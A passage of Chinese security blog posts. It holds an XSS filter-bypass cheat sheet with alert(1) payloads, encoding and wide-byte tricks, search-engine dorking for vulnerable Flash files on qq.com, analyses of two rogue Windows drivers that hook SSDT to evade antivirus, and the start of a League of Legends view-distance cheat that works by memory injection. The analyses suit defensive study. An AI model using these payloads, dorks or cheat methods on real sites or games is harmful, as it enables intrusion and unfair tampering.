<h3 id="一些绕过方法">一些绕过方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">换行符 %<span class="number">0</span>a</span><br><span class="line">反斜线 %<span class="number">5</span>c （js中字符串可以用\分开）</span><br><span class="line">&lt;&gt;  %<span class="number">3</span>C%<span class="number">3</span>E</span><br><span class="line">注释<span class="comment">/**/</span>可以代替 空格符</span><br><span class="line">%c0(宽字符gb2312)可以吃掉%<span class="number">5</span>c(反斜线) </span><br><span class="line">javascript中的字符可以写成unicode编码：</span><br><span class="line">&lt; 可以表示为 \u003c , &gt; 可以表示为 \u003e，空格可以表示为\u0020</span><br><span class="line">&lt; 可以表示为 \x3c , &gt; 可以表示为 \x3e，空格可以表示为\x20</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;   ----&gt; \u003Cimg\u0020src=<span class="number">1</span>\u0020onerror=alert(<span class="number">1</span>)\u003e</span><br><span class="line">                                                 ----&gt;  \x3Cimg\u0020src=<span class="number">1</span>\u0020onerror=alert(<span class="number">1</span>)\x3e</span><br><span class="line"></span><br><span class="line">JS字符串中，字符还可以表示为unicode的形式。即：单引号还可以表示为\u0027或\x27,可尝试\有没有被过滤</span><br><span class="line">&lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;标签不解析HTML</span><br><span class="line"><span class="string">"h"</span>+<span class="string">"t"</span>+<span class="string">"t"</span>+<span class="string">"p"</span>，绕过对http的过滤</span><br><span class="line">&lt;input onfocus=<span class="string">"alert(1)"</span> autofocus&gt;，自动执行</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;绕过对&lt;script&gt;的过滤</span><br><span class="line"><span class="comment">/**/</span>绕过对空格的过滤&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">"&lt;img/**/src='1'/**/onerror='alert(1)'/&gt;"</span>);<span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">标签中多对输入可以结合<span class="comment">/**/</span>的使用</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">""</span>;<span class="comment">/*"; 值为：";<span class="comment">/*，（首先闭合双引号，然后使用<span class="comment">/*注释，与下面注释进行闭合）var b = "*/</span>alert(1)//"; 值为：*/</span>alert(1)//</span><br><span class="line"></span><br><span class="line">如果是图片可能是判定后缀名在最后加上.jpg</span><br><span class="line">突破对长度的限制&lt;script&gt;eval(location.hash.slice(1))</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>#alert(‘a’)</span><br><span class="line">data协议，绕过chrome </span><br><span class="line">filter.php?url=<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='</span>&gt;</span>click<span class="tag">&lt;<span class="title">a</span>&gt;</span></span><br><span class="line">IE的注释方式<span class="comment">&lt;!--[if IE]&gt;&lt;img src=# width=0 height=0 onerror=alert(/insight-labs/)&gt;&lt;![endif]--&gt;</span></span><br><span class="line"></span><br><span class="line">chrome会自动对", &gt;, <span class="tag">&lt; 进行转换。</span><br><span class="line">&lt;<span class="attribute">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">chrome会过滤为<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>,绕过：<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">'127.0.0.1/1.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span> 其中1.jp也可以是1.jpg等，内容为js代码如:alert(1)</span></span><br></pre></td></tr></table></figure>
<h3 id="chrome如何搜索关键字">chrome如何搜索关键字</h3><p>基本语句肯定是 site:qq.com filetype:swf<br>意思是，限定域名为qq.com 文件类型为FLASH文件。<br>显然这样会搜索出很多FLASH文件，不利于我们后续的漏洞查找，所以我们需要输入某个关键词来进一步缩小范围。<br>这里我列举一些寻找关键词的方式。<br>1 已知存在缺陷的FLASH文件名或参数名，如：swfupload,jwplayer等<br>2 多媒体功能的FLASH文件名，如：upload，player, music, video等<br>3 调用的外部配置或数据文件后缀，如: xml, php 等<br>4 前期经验积累下来的程序员特征参数名用词，如: callback, cb , function 等<br>结合以上经验，使用其中第三条：<br>搜索： site:qq.com filetype:swf inurl:xml<br>可以找到这个FLASH</p>
<h3 id="插入漏洞方式">插入漏洞方式</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1 JavaScript中字符串之间的运算利用</span><br><span class="line">&lt;a href="javascript:alert(1)//html"&gt;click me&lt;/a&gt;</span><br><span class="line">&lt;a href="javascript:alert(1)-html"&gt;click me&lt;/a&gt;</span><br><span class="line">执行呈现相同的效果，因为javascript是弱类型语言，所以字符串与字符串之间的各种运算都是合法的</span><br><span class="line"></span><br><span class="line">2 HTML属性在执行时会做HTMLDecode编码</span><br><span class="line">HTML属性：十进制和十六进制，&amp;#56和&amp;#x5a形式 </span><br><span class="line">CSS属性：十进制和十六进制，\6c形式</span><br><span class="line">JavaScript：八进制和十六进制，\56,和\x5c形式，汉字需要使用Unicode编码，\u0000形式</span><br><span class="line">&lt;img src="http://www.baidu.com/img/bdlogo.gif"&gt;</span><br><span class="line">&lt;img src="&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e;&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x69;&amp;#x6d;&amp;#x67;&amp;#x2f;&amp;#x62;&amp;#x64;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x6f;&amp;#x2e;&amp;#x67;&amp;#x69;&amp;#x66;";&gt;</span><br><span class="line">需要留出双引号，不可对双引号进行转移</span><br><span class="line"></span><br><span class="line">3、宽字节处理addslashs，单引号、双引号、反斜杠之前加反斜杠的情况</span><br><span class="line">原理：网页头部指明这是GBK编码，GBK编码第一字节的范围是0x81~0xFE，第二字节的范围是0x40~0x7E与0x80~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5C，正好是GBK的低字节中，如果之前有一个高字节，那么正好会被组成一个合法字符。</span><br><span class="line">&lt;?php </span><br><span class="line">header("Content-Type:text/html;charset=GBK");?&gt;  </span><br><span class="line">&lt;script&gt;      </span><br><span class="line">var a="</span><br><span class="line">&lt;?php </span><br><span class="line">echo addslashes($_GET['url']);</span><br><span class="line">?&gt;</span><br><span class="line">";  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">?&gt;  构造：.php?url=123%81";alert(1);//</span><br><span class="line"></span><br><span class="line">4、UTF-7编码(仅IE支持，会自动判断是否出现UTF-7编码的字符串)</span><br></pre></td></tr></table></figure>
<h3 id="DOM_xss特点">DOM xss特点</h3><ol>
<li>利用代码也是在地址栏里输入，</li>
<li>在JS里，通过location.search得到地址里的代码，类似的还有:<br>A.location.href : 地址栏里的地址,<br>B.location.hash: 地址栏里#及其之后的内容,<br>C.document.referrer: 当前页面的源（比如你从A.com点一个链接进入了B.com，那么B.com里的document.referrer等于A.com）</li>
<li>通过JS设置了iframe的src属性，这是一个典型的通过JS操作属性而导致的XSS。</li>
</ol>
<p>查找此类漏洞的方法 </p>
<ol>
<li>以location为关键词进行查找，</li>
<li>进而看location传入的参数是否被过滤后再进行使用。</li>
<li>如有未过滤而被调用的情况，则考虑如何构造利用代码。</li>
</ol>
<h3 id="11个免费的Web安全测试工具">11个免费的Web安全测试工具</h3><p>1.Netsparker Community Edition(Windows)<br>这个程序可以检测SQL注入和跨页脚本事件。当检测完成之后它会给你提供一些解决方案。<br>2.Websecurify(Windows, Linux, Mac OS X)<br>这是个简单易用的开源工具，此程序还有一些人插件支持，可以自动检测网页漏洞。运行后可生成多种格式的检测报告<br>3.Wapiti(Windows, Linux, Mac OS X)<br>这是一个用Python编写的开源的工具，可以检测网页应用程序，探测网页中存在的注入点。<br>4.N-Stalker Free Version(Windows)<br>此工具可一次检测100个以上的页面，包括跨页脚本的检测。<br>5.skipfish(Windows, Linux, Mac OS X)<br>这是一个轻量级的安全测试工具，处理速度很快，每秒可处理2000个请求。<br>6.Scrawlr(Windows)<br>HP的一款免费软件，可检测SQL注入漏洞。<br>7.Watcher(Windows) <a href="http://websecuritytool.codeplex.com/documentation" target="_blank" rel="external">http://websecuritytool.codeplex.com/documentation</a><br>这个是Fiddler的插件，可在后台静默运行，可检测跨域提交等。。<br>8.x5s(Windows) <a href="http://xss.codeplex.com/releases/view/43170" target="_blank" rel="external">http://xss.codeplex.com/releases/view/43170</a><br>跟前一个一样也是Fiddler的插件，用于检测存在XSS漏洞，在网页提供给用户输入的地方是否有过滤&lt;, &gt;等字符。<br>9.Exploit-Me(Windows, Linux, Mac OS X)<br>这个是火狐的插件，由XSS-Me，SQL Inject Me 和 Access-Me 这3个构成，当浏览网页时就会开始检测，可检测XSS漏洞，SQL注入漏洞等。<br>10.WebScarab(Windows, Linux, Mac OS X)<br>这个实际上是一个代理软件，有很多功能，可以检测XSS跨站脚本漏洞、SQL注入漏洞等。。<br>11.Acunetix Free Version(Windows)<br>这个是免费版，相对于专业版来说有一些功能限制，不过还是可以用的，可检测网站上的XSS漏洞。</p>
<h3 id="其他">其他</h3><p>1.二哥的XSS教学 - by gainover<br><a href="http://xsst.sinaapp.com/example/1-1.php" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-1.php</a><br>2.心伤的瘦子 [腾讯实例教程] 那些年我们一起学XSS)<br><a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90/type/1/page/1" target="_blank" rel="external">http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90/type/1/page/1</a><br>3.HTML特殊字符编码对照表<br><a href="http://www.jb51.net/onlineread/htmlchar.htm" target="_blank" rel="external">http://www.jb51.net/onlineread/htmlchar.htm</a><br>4.html字符实体<br><a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="external">http://www.w3school.com.cn/html/html_entities.asp</a><br>5.xss字符转换工具：<br><a href="http://app.baidu.com/app/enter?appid=280383" target="_blank" rel="external">http://app.baidu.com/app/enter?appid=280383</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2014/10/15/technic-xss-bypass/" data-id="civbwoo71001j5p6isqumzs5d" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2014/10/15/technic-xss-bypass/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-virus-malware-driver-hmbb" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/09/10/virus-malware-driver-hmbb/" class="article-date">
  <time datetime="2014-09-10T09:52:11.000Z" itemprop="datePublished">2014-09-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/virus/">virus</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/09/10/virus-malware-driver-hmbb/">病毒分析-haimianbaobao流氓驱动</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>haimianbaobao流氓驱动行为分析以及溯源追查</p>
<h2 id="简介">简介</h2><p>MD5 : b9003854bee6ea8e5b1fc24ebc99bb4a<br>行为: haimianbaobao.exe流氓驱动，劫持浏览器，过滤杀软</p>
<p>1.该驱动程序注册一个进程创建回调函数，监视浏览器创建主进程，注入dll文件对浏览器操作进行劫持。</p>
<p>2.通过HOOK驱动\FileSystem\Ntfs与SSDT表中大量的内核函数，从而过滤掉杀软对其操作，保护自身。</p>
<h2 id="行为分析">行为分析</h2><p>1.驱动加载后，先检测下驱动注册表，然后获取ntdll.dll模块基址，获取其函数导出地址<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-1.png" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-2.png" alt=""></p>
<p>2.调用函数PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，监控创建进程，如果是浏览器进程，则判断其父进程如果是explorer.exe进程，则将haimianbaobao.dll注入到该进程中，对浏览器进行劫持;<br>如果为haimianbaobao.exe进程，则加载。haimianbaobao.dll位于C:\Documents and Settings\admin\Lhb\InstDrv\haimianbaobao.dll<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-3.png" alt=""></p>
<p>3.HOOK驱动\FileSystem\Ntfs的 IRP_MJ_DIRECTORY_CONTROL来过滤杀软文件操作来保护自身文件<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-4.png" alt=""></p>
<p>4.判断如果IRP请求是杀软进程操作，则过滤掉其IRP请求<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-5.png" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-6.png" alt=""></p>
<p>5.HOOK 驱动\FileSystem\Ntfs的 IRP_MJ_CREATE和IRP_MJ_READ来保护自身文件<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-7.png" alt=""></p>
<p>6.检测操自身文件的请求进程如果不是以下进程列表，则过滤掉其IRP请求<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-8.png" alt=""></p>
<p>7.创建进程用于过滤杀软请求，枚举系统模块信息，获取360驱动模块起始地址，获取的驱动模块分别为</p>
<pre><code>360Selfprotection.sys |<span class="string"> qutmdrv.sys </span>|<span class="string"> 360Avflt.sys </span>|<span class="string"> 360Box.sys </span>|<span class="string"> BAPIDRV.sys </span>
</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-9.png" alt=""></p>
<p>8.根据系统版本，获取SSDT表索引，HOOK SSDT表<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-10.png" alt=""></p>
<p>9.如果调用ZwQuerySystemInformation函数，如果其调用模块是否位于360驱动模块中，或者位于杀软进程模块中，且该函数是否对haimianbaobao.exe进程进行操作，则将haimianbaobao.exe进程从进程结构序列中去除。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-11.png" alt=""></p>
<p>10.相同原理，过滤掉杀软对自身的ZwQueryInformationProcess，ZwReadFile，ZwTerminateProcess等操作。</p>
<h2 id="溯源查找">溯源查找</h2><h3 id="概述">概述</h3><p>Haimianbaobao通过推广软件捆绑安装，感染主机之后会释放驱动文件对浏览器进行劫持，同时通过HOOK SSDT过滤掉360杀软的操作请求，使360杀软进入离线模式保护自身。</p>
<h3 id="推广行为">推广行为</h3><p><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-12.png" alt=""></p>
<p>1.简易计算器scalculator.exe(md5: 8fc563782ad0d18e757fee6374b976d6)<br>该程序以uninstallself参数方式启动，隐藏窗口后台运行。之后添加开机自启动，从配置文件读取usrid和version下载推广软件到目录\scalculator\_temp.exe。同时，还会调用同目录下\supdate.exe进行更新并记录配置文件。</p>
<p>2.推广程序_temp.exe(md5:4B863BD16F6FFBDB940F783D47669886)<br>该程序启动后从远程服务器下载安装推广软件haimianbaobao程序。<br>下载链接:</p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/k360.it537.com/maindata</span>3.php?install=<span class="number">00</span><span class="symbol">:</span><span class="number">0</span><span class="constant">C:</span><span class="number">29</span><span class="symbol">:D9</span><span class="symbol">:D9</span><span class="symbol">:AD&amp;qudaoid=&amp;ver=</span><span class="number">6.5</span>.<span class="number">1.9</span>&amp;name=haimianbaobao&amp;success=<span class="number">06</span>
</code></pre><p>更新链接:</p>
<pre><code><span class="string">http:</span><span class="comment">//updata.it537.com/cnzz/hmbb.html?qudaoid=&amp;ver=6.5.1.9&amp;name=haimianbaobao&amp;sucess=06</span>
</code></pre><p>日志文件 \haimianbaobao\bin\log_out.txt</p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/k360.it537.com/maindata</span>3.php?qw=bY4<span class="variable">%7BfFGuaE2vNFnxSyp</span><span class="variable">%7BNUrDPVoFQSqDQD</span><span class="variable">%5CweYQid1mmOT</span><span class="variable">%5C1</span><span class="variable">%5BZH</span><span class="variable">%3APh53KkGtPUYv</span><span class="variable">%5BV2nOXjgbY0q</span><span class="variable">%0F</span><span class="variable">%09ZY4j</span><span class="variable">%5BV</span><span class="variable">%3AkXX</span><span class="variable">%3Ald5Uk</span><span class="variable">%5B1W</span><span class="variable">%7Cb</span><span class="variable">%7B2vOi</span><span class="variable">%3C</span><span class="variable">%3E</span>
</code></pre><p>3.haimianbaobao推广程序<br>该程序会在感染系统加载驱动文件haimianbaobao.sys，该驱动程序注册一个进程创建回调函数，监视浏览器创建主进程，注入dll文件对浏览器操作进行劫持。同时通过HOOK驱动\FileSystem\Ntfs与SSDT表中大量的内核函数，从而过滤掉杀软的请求包，使杀软处于离线状态，保护自身。</p>
<p>4.后续分析<br>4.1 之前推断天之游侠游戏为推广母体不正确，该游戏启动时会遍历系统文件查找自身文件，因此对简易计算器文件有操作行为，查数据库时误以为是其释放，因此天之游侠游戏并非推广母体，暂时没有找到推广母体。<br>4.2 之后通过用户uuid查询用户最近几天的文件操作，发现存在天气日历，快看影视浏览器等推广软件，这几个软件是最近在黑top比较活跃的，因此暂时判断其为同一推广母体所推广安装，后续继续跟进。</p>
<p>5.查用户uuid = acc0be0a644b5b2fac08b1100ae3baf8最近的文件操作，里边有天气日历，快看影视，这些都是最近黑TOP比较活跃的推广软件，印象中首趣有推广这些软件，随进行分析。<br>官网下载链接：<a href="http://sq.cyousoft.com/" target="_blank" rel="external">http://sq.cyousoft.com/</a><br>MD5: 34E75CC128BB19B6D4E77315B8767123<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-13.png" alt=""></p>
<p>6.程序进程启动起来后，先向远程服务器发送Get请求，获取推广安装包数据，链接为：</p>
<pre><code>xml.tai69.com/config.php?v=<span class="number">1.0</span><span class="number">.3</span><span class="number">.9</span>
</code></pre><p>推广安装包数据加密存储，抓包如下<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-14.png" alt=""><br>将该数据下载到Temp目录下AAA.xml文件，该数据进行zip加密压缩， (压缩密码：123@*qSz) 解密过后得到推广软件列表。</p>
<pre><code>hao123|<span class="string">huaen123</span>|<span class="string">PPTV</span>|<span class="string">B5T_Setup.exe</span>|bdcalendar
</code></pre><p>推广列表中未找到简易计算器</p>
<p>7.百度搜haimianbaobao.dll 找到该篇帖子：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-15.png" alt=""><br>随后进入乐飞影视，随便找个视频播放，提示安装全能播放器<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-16.png" alt=""></p>
<pre><code>最新版下载：首趣播放器 MD5: <span class="number">7</span>CC707937A415CF3EB88FBAF8242BA06 于<span class="number">0918</span>更新 MD5: <span class="number">6F</span>15675F2861B8AD9D2D499473062E08
备用版下载：鱼鱼影音浏览器 MD5: <span class="number">5</span>B41718D886BA3DD571CD55D4DCB16EE
</code></pre><p>8.首趣播放器<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-17.png" alt=""><br>该程序运行先在Temp目录下释放setup文件，然后创建进程，启动参数为</p>
<pre><code><span class="string">"释放Setup文件"</span> /SL5=<span class="string">"<span class="variable">$B021C</span>,1045444,66048,首趣播放器"</span> 如下所示：
</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-18.png" alt=""><br>新进程启动起来后，先向远程服务器发送Get请求，获取推广安装包数据，链接为：</p>
<pre><code>xml.tai69.com/config.php?v=<span class="number">1.0</span><span class="number">.4</span><span class="number">.2</span>
</code></pre><p>推广安装包数据加密存储，抓包如下<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-19.png" alt=""><br>解密过后得到推广软件列表，未找到简易计算器。</p>
<pre><code>风行在线|<span class="string">壁纸在线</span>|<span class="string">设置导航为主页</span>|<span class="string">…</span>|<span class="string">天气日历 </span>|<span class="string"> 快看影视</span>|<span class="string">…</span>
</code></pre><p>在推广软件列表中未找到简易计算器。<br>同样0918更新推广的软件列表中也没有找到简易计算器。</p>
<p>9.鱼鱼影音浏览器 推广安装列表：download.yuyu.com/0822/setup.html<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-hmbb-20.png" alt=""><br>在推广列表中未找到简易计算器。</p>
<p>10.后续<br>卒…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2014/09/10/virus-malware-driver-hmbb/" data-id="civbwoo64000o5p6i5j7o9zg5" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2014/09/10/virus-malware-driver-hmbb/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/流氓/">流氓</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/驱动/">驱动</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-virus-malware-driver-filter" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/09/02/virus-malware-driver-filter/" class="article-date">
  <time datetime="2014-09-02T08:54:11.000Z" itemprop="datePublished">2014-09-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/virus/">virus</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/09/02/virus-malware-driver-filter/">病毒分析-驱动过滤</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>一个流氓驱动行为简略分析</p>
<h2 id="简介">简介</h2><p>驱动模块主要两个功能：<br>1.通过PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，用于监控explorer.exe进程进行注入</p>
<p>2.添加TCP过滤，用于向远程服务器发送GET请求，请求数据为各个函数调用状态</p>
<p><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-1.jpg" alt=""></p>
<h2 id="行为">行为</h2><h3 id="TCP驱动过滤">TCP驱动过滤</h3><p>1.通过IoCreateDevice，IoAttachDeviceToDeviceStack等函数创建设备对象。程序每个函数调用结果会通过该设备对象发送远程服务器<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-2.jpg" alt=""></p>
<p>2.其中Host采用16进制写入变量中，循环向这四个服务器发送请求，服务器响应暂停<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-3.jpg" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-4.jpg" alt=""></p>
<pre><code>MsgLog为各函数调用状态
QuDao为驱动winntnetsys.sys注册表下DisplayName的键值中的标识符
<span class="keyword">MAC</span>为本机<span class="keyword">MAC</span>地址
SESID为当前系统时间
</code></pre><p>3.抓包如下所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-5.jpg" alt=""></p>
<h3 id="进程注入">进程注入</h3><p>1.进程创建回调函数NotifyRoutine，先检测系统，如果不是XP和WIN7不进行注入，之后调用PsCreateSystemThread创建注入进程<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-6.jpg" alt=""></p>
<p>2.通过IoGetCurrentProcess获取进程EPROCESS结构，然后取偏移0x174(win7下为0x16C)获取ImageFileName，判断是否为exploere.exe进程，如果是的话调用PsGetProcessId返回进程ID<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-7.jpg" alt=""></p>
<p>3.获取\SystemRoot\system32\目录下的thunk.dll和winntnetsys.dll，计算出MD5值进行效验，效验成功开始注入。注入通过修改PEB结构+0x18处DefaultHeap到自定义的堆结构中，将其插入APC队列中加载到内存。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-8.jpg" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/virus-malware-driver-9.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2014/09/02/virus-malware-driver-filter/" data-id="civbwoo67000t5p6icjjx74hw" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2014/09/02/virus-malware-driver-filter/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/过滤/">过滤</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/驱动/">驱动</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-technic-lol-infinite-sight" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/08/25/technic-lol-infinite-sight/" class="article-date">
  <time datetime="2014-08-25T08:36:24.000Z" itemprop="datePublished">2014-08-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/technic/">technic</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/08/25/technic-lol-infinite-sight/">英雄联盟无限视距实现代码</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="原理">原理</h2><p>游戏进程<code>League of Legends.exe</code>中某个偏移记录着视距值，游戏根据这个数值设置你的当前游戏的屏幕分辨率，最大只能达到屏幕的极限分辨率那么大，所以一旦调的太大了外面只能看到黑色一片。</p>
<h2 id="实现方法">实现方法</h2><p>修改的方法也分两种，一种是将进程文件<code>League of Legends.exe</code>打开直接搜索其中默认的Float类型视距值2250，将其改为最大值4450，最大值其实没有上限，不过改的再大也是4450的效果。这种方法有个缺点，就是游戏一旦更新，这个进程文件改变，相应的偏移位置也会发生变化，所以还要重新去修改，比较麻烦。</p>
<p>这里说第二种方法，游戏运行起来后，动态从内存中搜索到视距值的位置，直接通过注入的方式，将视距值动态写进去，为减少对游戏的影响，只在进入游戏界面的时候进行修改操作，游戏结束后将原始视距值复原。并且为了兼容以后视距原始值以及修改最大值的变更，将这些参数全写入配置文件，想更改只需要修改配置文件里相应的值即可。</p>
<h2 id="实现代码">实现代码</h2><h3 id="主流程逻辑">主流程逻辑</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 